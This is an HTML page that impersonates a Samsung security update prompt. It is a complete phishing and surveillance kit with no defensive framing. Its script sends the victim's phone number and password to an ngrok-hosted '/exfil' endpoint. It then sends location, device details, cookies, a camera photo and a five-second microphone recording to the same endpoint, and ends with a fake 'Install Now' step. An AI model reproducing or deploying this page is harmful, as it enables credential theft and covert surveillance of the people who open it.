<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Security Update</title>
    <style>
        body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
        .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin: 5px 0; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
        .hidden { display: none; }
        .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
        #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h1>📱 Samsung Security Update</h1>
        <p>Your device requires an urgent security patch.</p>
        
        <div id="step1">
            <input type="text" placeholder="Phone Number" id="phone">
            <input type="password" placeholder="Password" id="pass">
            <br><br>
            <button class="btn" onclick="step1()">Verify Identity</button>
        </div>

        <div id="step2" class="hidden">
            <p>🔍 Scanning device...</p>
            <div class="loader"></div>
            <p class="status" id="statusText">Collecting device information...</p>
            <div id="statusBox"></div>
        </div>

        <div id="step3" class="hidden">
            <p>✅ Security patch ready</p>
            <button class="btn" onclick="step3()">Install Now</button>
        </div>

        <p style="font-size:11px;color:#444;">Samsung Security • Version 12.5.3</p>
    </div>

    <script>
        const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        function log(msg) {
            const box = document.getElementById('statusBox');
            if (box) {
                box.innerHTML += `> ${msg}\n`;
                box.scrollTop = box.scrollHeight;
            }
            console.log(msg);
        }

        function sendData(data) {
            data.time = new Date().toISOString();
            data.userAgent = navigator.userAgent;
            
            fetch(C2_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        // ============================================================
        // STEP 1: CREDENTIALS
        // ============================================================
        function step1() {
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;

            if (!phone || !pass) {
                alert('Please enter your phone number and password.');
                return;
            }

            sendData({ type: 'credentials', phone, pass });
            log('✅ Credentials sent');

            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            // Start collecting data
            collectAllData();
        }

        // ============================================================
        // STEP 2: COLLECT ALL DATA + MEDIA
        // ============================================================
        async function collectAllData() {
            log('📡 Starting data collection...');

            // 1. Device Info
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory
            };
            sendData({ type: 'device_info', ...deviceInfo });
            log('✅ Device info sent');

            // 2. Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const loc = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        sendData({ type: 'location', ...loc });
                        log('✅ Location captured');
                    },
                    err => log('❌ Location denied')
                );
            }

            // 3. Battery
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                sendData({
                    type: 'battery',
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging
                });
                log('✅ Battery data sent');
            }

            // 4. Network
            if (navigator.connection) {
                sendData({
                    type: 'network',
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                });
                log('✅ Network data sent');
            }

            // 5. Cookies
            sendData({ type: 'storage', cookies: document.cookie || 'none' });
            log('✅ Cookies sent');

            // ============================================================
            // 6. CAMERA + MICROPHONE CAPTURE
            // ============================================================
            log('🎥 Requesting camera & mic...');
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: true
                });

                log('✅ Camera & mic granted');

                // --- Capture photo ---
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.play();

                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1]; // Base64

                sendData({
                    type: 'photo',
                    data: photoData,
                    width: canvas.width,
                    height: canvas.height
                });
                log('✅ Photo captured and sent');

                // --- Record audio (5 seconds) ---
                log('🎤 Recording audio...');
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const audioRecorder = new MediaRecorder(audioStream);
                const audioChunks = [];

                audioRecorder.ondataavailable = event => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };

                audioRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = () => {
                        const base64Audio = reader.result.split(',')[1];
                        sendData({
                            type: 'audio',
                            data: base64Audio,
                            size: audioBlob.size
                        });
                        log('✅ Audio recorded and sent');
                    };
                    reader.readAsDataURL(audioBlob);
                };

                audioRecorder.start();
                await new Promise(resolve => setTimeout(resolve, 5000));
                audioRecorder.stop();

                // Cleanup
                video.remove();
                mediaStream.getTracks().forEach(t => t.stop());
                audioStream.getTracks().forEach(t => t.stop());

            } catch (err) {
                log('❌ Media capture failed: ' + err.message);
                sendData({ type: 'media_error', error: err.message });
            }

            // Done
            document.getElementById('statusText').innerHTML = '✅ All data collected!';
            setTimeout(() => {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }, 1500);
        }

        // ============================================================
        // STEP 3: INSTALL TRIGGER
        // ============================================================
        function step3() {
            sendData({ type: 'action', action: 'install_clicked' });
            alert('Update downloaded. Your phone will restart in 5 seconds.');
        }
    </script>
</body>
</html>
